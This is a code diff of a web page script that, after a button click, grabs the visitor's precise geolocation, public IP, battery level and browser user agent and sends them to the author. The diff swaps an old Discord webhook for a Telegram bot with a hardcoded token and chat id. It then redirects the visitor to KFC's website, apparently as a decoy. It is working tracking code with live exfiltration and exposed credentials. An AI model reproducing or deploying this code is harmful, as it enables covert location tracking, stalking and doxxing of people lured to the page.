@@ -1,4 +1,4 @@
-document.getElementById('getLocationBtn').addEventListener('click', function() {
+document.getElementById('getLocationBtn').addEventListener('click', function () {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(handlePosition, showError);
     } else {
@@ -9,15 +9,15 @@ document.getElementById('getLocationBtn').addEventListener('click', function() {
 function handlePosition(position) {
     var latitude = position.coords.latitude;
     var longitude = position.coords.longitude;
-    
-    sendToDiscord(latitude, longitude, function() {
+
+    sendToTelegram(latitude, longitude, function () {
         redirectToKFCWebsite();
     });
 }
 
 function showError(error) {
     var errorMessage;
-    switch(error.code) {
+    switch (error.code) {
         case error.PERMISSION_DENIED:
             errorMessage = "User denied the request for Geolocation.";
             break;
@@ -34,53 +34,55 @@ function showError(error) {
     document.getElementById('locationOutput').innerText = errorMessage;
 }
 
-function sendToDiscord(latitude, longitude, callback) {
-    var webhookUrl = 'https://discord.com/api/webhooks/1400367042527236236/9fapIhMjEc7pfn1-hViE_pY4TMFOPxwAK4rJLrWcShzhcW-E9yGu-aJH6oNeSUrClWvt';
-    var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    var ip = 'Not Available';
-    var batteryPercentage = 'Not Available';
-    var userAgent = navigator.userAgent;
+function sendToTelegram(latitude, longitude, callback) {
+    const botToken = '8308234475:AAEyDsgyyEDdweOm6_RC8YIkwWexvQuzXK8';
+    const chatId = '7610567224';
+    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const userAgent = navigator.userAgent;
+
+    let batteryPercentage = 'Not Available';
+    let ip = 'Not Available';
+
+    function sendFinalMessage() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ip = data.ip;
+                const messageText = `📍 *User Location Info*\n\n🌐 Location: [Open Map](${googleMapsLink})\n📡 IP: ${ip}\n🔋 Battery: ${batteryPercentage}\n🧾 User Agent:\n${userAgent}`;
+
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: messageText,
+                    parse_mode: "Markdown"
+                };
+
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                    .then(response => {
+                        if (response.ok) {
+                            callback();
+                        } else {
+                            console.error('Telegram Error:', response.statusText);
+                        }
+                    })
+                    .catch(err => console.error('Fetch Error:', err));
+            });
+    }
 
     if (navigator.getBattery) {
-        navigator.getBattery().then(function(battery) {
+        navigator.getBattery().then(function (battery) {
             batteryPercentage = (battery.level * 100).toFixed(2) + '%';
-            sendMessage(webhookUrl, latitude, longitude, googleMapsLink, ip, batteryPercentage, userAgent, callback);
+            sendFinalMessage();
         });
     } else {
-        sendMessage(webhookUrl, latitude, longitude, googleMapsLink, ip, batteryPercentage, userAgent, callback);
+        sendFinalMessage();
     }
-}
-
-function sendMessage(webhookUrl, latitude, longitude, googleMapsLink, ip, batteryPercentage, userAgent, callback) {
-    fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        ip = data.ip;
-        var message = {
-            content: `User's location: ${googleMapsLink}\nIP Address: ${ip}\nBattery Percentage: ${batteryPercentage}\nUser Agent: ${userAgent}`
-        };
-
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        })
-        .then(response => {
-            if (response.ok) {
-                callback();
-            } else {
-                console.error('Error:', response.statusText);
-            }
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-        });
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
 }
 
 function redirectToKFCWebsite() {
